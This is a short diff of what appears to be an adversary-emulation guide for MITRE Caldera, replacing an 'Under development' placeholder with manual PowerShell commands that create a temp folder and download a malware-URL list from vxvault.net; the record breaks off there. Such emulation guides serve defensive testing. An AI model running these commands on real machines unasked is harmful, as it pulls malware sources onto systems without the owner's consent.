@@ -80,7 +80,7 @@ Using Mitre Caldera, you can deploy the Techniques "Crypto (Monero) Mining (T149
 
 ---
 #### Impact 2
-Under development..
+Using Mitre Caldera, execute the following Manual Commands.
 
         New-Item -Path c:\tmp -ItemType Directory;
         Invoke-WebRequest http://vxvault.net/URL_List.php -OutFile c:\tmp\urls.txt;
